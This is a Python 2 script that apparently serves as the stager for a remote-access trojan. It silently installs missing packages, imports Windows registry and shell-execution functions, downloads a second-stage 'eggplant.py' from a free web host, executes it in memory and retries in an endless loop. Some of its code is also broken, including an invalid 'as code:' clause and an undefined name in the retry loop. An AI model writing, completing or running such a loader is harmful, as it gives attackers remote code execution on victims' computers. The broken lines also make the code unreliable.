#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, socket, subprocess
import pip.commands.install as pip
from imp import new_module
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from time import sleep
from requests import get, post
from uuid import uuid1
from warnings import filterwarnings

"""Cryptography Packages"""
try:
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256
    from Crypto.Util.number import bytes_to_long, long_to_bytes
except Exception as e:
    print str(e)

"""Windows Packages"""
try:
    if os.name is 'nt':
        from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
        from ctypes import windll
        from win32com.shell.shell import ShellExecuteEx
except Exception as e:
    print str(e)

def missing_dependencies():
    """Verify dependencies and fix missing packages"""
    dependencies = dict({'AES':'pycrypto','HMAC':'pycrypto','SHA256':'pycrypto','ShellExecuteEx':'win32com','b64decode':'base64','b64encode':'base64','bytes_to_long':'pycrypto','get':'requests','hexlify':'binascii','long_to_bytes':'pycrypto','sleep':'time','unhexlify':'binascii','uuid1':'uuid'})
    packages     = set([package for package in globals() if package in dependencies])
    missing      = set([dependencies.get(i) for i in list(set(dependencies.keys()).symmetric_difference(packages)) if dependencies.get(i)])
    return missing

def install(packages):
    """Install missing packages"""
    for pkg in packages:
        try:
            pip.InstallCommand().main([pkg])
        except: pass
    execfile(sys.argv[0])
    sys.exit(0)

def resource_path(relative_path):
    """Helper function for compiling executables"""
    return os.path.join(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))), relative_path)

def create_module(module_code, module_name):
    """Create new module from a string, text file, code from a URL, or code from a compiled-binary"""
    module = new_module(module_name)
    exec module_code in module.__dict__
    return module

def loop(*purple):
    while True:
        try:
            if not purple:
                purple = Eggplant()
            try:
                e = purple.run(purple.socket)
            except: pass
        except Exception as ec:
            print str(ec)
        print 'Retrying in 10...'
        sleep(10)

def main():
    dependencies = missing_dependencies()
    if len(dependencies):
        install(dependencies)
    try:
        code     = get('http://elderlyeggplant.000webhostapp.com/eggplant.py').text.encode() as code:
        Eggplant = create_module(code,'Eggplant')
        Eggplant.run(Eggplant.socket)
    except Exception as x:
        print str(x)
        sys.exit(0)


if __name__ == '__main__':
    main()
